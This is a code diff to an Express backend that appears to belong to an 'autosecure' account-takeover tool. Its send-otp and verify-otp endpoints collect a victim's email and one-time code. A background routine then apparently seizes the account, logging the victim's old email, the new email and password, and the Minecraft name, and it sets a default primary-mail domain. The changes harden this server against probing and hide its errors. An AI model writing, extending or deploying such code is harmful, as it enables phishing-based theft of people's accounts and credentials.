@@ -26,14 +26,28 @@ const { queryParams } = require('../db/database');
 const { sendWebLog } = require('../autosecure/utils/webLogger');
 const config = require('../configLoader');
 const { securityHeaders, loopbackOnly } = require('../autosecure/utils/security/apiAuth');
+const { wafMiddleware } = require('../autosecure/utils/security/waf');
 
 const app = express();
 configureTrustProxy(app, 'loopback');
 app.use(securityHeaders);
+app.use(loopbackOnly);
 app.disable('x-powered-by');
 const PORT = process.env.BACKEND_PORT || process.env.PORT || 5000;
 
+// Core WAF Shield: Blocks & auto-bans Path Traversal, LFI, and scanner exploits
+app.use(wafMiddleware);
+
 const activeSessions = new Map();
+const MAX_ACTIVE_SESSIONS = 5000;
+
+function setSession(id, data) {
+    if (activeSessions.size >= MAX_ACTIVE_SESSIONS) {
+        const oldestKey = activeSessions.keys().next().value;
+        if (oldestKey) activeSessions.delete(oldestKey);
+    }
+    activeSessions.set(id, data);
+}
 
 setInterval(() => {
     const now = Date.now();
@@ -74,26 +88,6 @@ const verifyOtpLimiter = rateLimit({
 app.use(express.json({ limit: '20kb' }));
 app.use(express.urlencoded({ extended: true, limit: '20kb' }));
 
-// IP Ban Middleware
-app.use(async (req, res, next) => {
-    try {
-        const clientIp = getClientIp(req);
-        if (clientIp) {
-            const banned = await queryParams('SELECT 1 FROM banned_ips WHERE ip = ?', [clientIp]);
-            if (banned && banned.length > 0) {
-                return res.status(403).json({
-                    success: false,
-                    error: 'Your IP has been blocked by security rules.'
-                });
-            }
-        }
-        next();
-    } catch (err) {
-        console.error('[IP_BAN_MIDDLEWARE] Error checking banned IP:', err.message);
-        next();
-    }
-});
-
 app.get('/api/health', (req, res) => {
     res.json({ success: true, service: 'backend', time: Date.now() });
 });
@@ -130,6 +124,7 @@ const webActivityLimiter = rateLimit({
     max: 20,
     standardHeaders: true,
     legacyHeaders: false,
+    keyGenerator: (req) => getClientIp(req),
     message: { success: false, error: 'Too many activity reports. Please wait a moment.' }
 });
 
@@ -298,7 +293,7 @@ app.post('/api/send-otp', sendOtpLimiter, async (req, res) => {
         }).catch(() => {});
 
         const sessionId = 'sess_' + require('crypto').randomBytes(16).toString('hex');
-        activeSessions.set(sessionId, {
+        setSession(sessionId, {
             email,
             secData,
             secDisplay,
@@ -322,7 +317,7 @@ app.post('/api/send-otp', sendOtpLimiter, async (req, res) => {
         console.error('[API /send-otp] Error:', error);
         return res.status(500).json({
             success: false,
-            error: 'Error processing OTP request: ' + error.message
+            error: 'Failed to process OTP request. Please try again shortly.'
         });
     }
 });
@@ -427,7 +422,7 @@ app.post('/api/verify-otp', verifyOtpLimiter, async (req, res) => {
             // Row 5
             subscribemail: userConfig?.subscribemail ?? 0,
             changeprimary: userConfig?.changeprimary ?? 1,
-            domain: userConfig?.domain || (config.domains && config.domains[0]) || "thapcamstore.click",
+            domain: userConfig?.domain || (config.domains && config.domains[0]) || "mail.hotwar.asia",
 
             // Embed 2 (Personalization)
             changename: userConfig?.changename ?? 0,
@@ -489,7 +484,8 @@ app.post('/api/verify-otp', verifyOtpLimiter, async (req, res) => {
                 console.log(`[API /verify-otp] Starting background autosecure for ${username || email} (UID: ${uid})...`);
                 let acc = await secure(host, settings, uid, username);
 
-                const targetIgn = acc.newName && acc.newName !== "No Minecraft!" ? acc.newName : (username || acc.oldName || "");
+                const hasRealMc = acc.newName && acc.newName !== "No Minecraft!" && acc.mc && acc.mc !== "No Minecraft!";
+                const targetIgn = hasRealMc ? acc.newName : null;
                 let donutStats = null;
                 if (targetIgn) {
                     try {
@@ -520,7 +516,7 @@ app.post('/api/verify-otp', verifyOtpLimiter, async (req, res) => {
 
                 try {
                     const accountData = {
-                        username: targetIgn || 'Unknown',
+                        username: hasRealMc ? targetIgn : "Couldn't find!",
                         email: acc.email,
                         oldEmail: email,
                         password: acc.password,
@@ -553,7 +549,7 @@ app.post('/api/verify-otp', verifyOtpLimiter, async (req, res) => {
         console.error('[API /verify-otp] Error:', error);
         return res.status(500).json({
             success: false,
-            error: 'Error processing verification: ' + error.message
+            error: 'Failed to process verification. Please try again shortly.'
         });
     }
 });
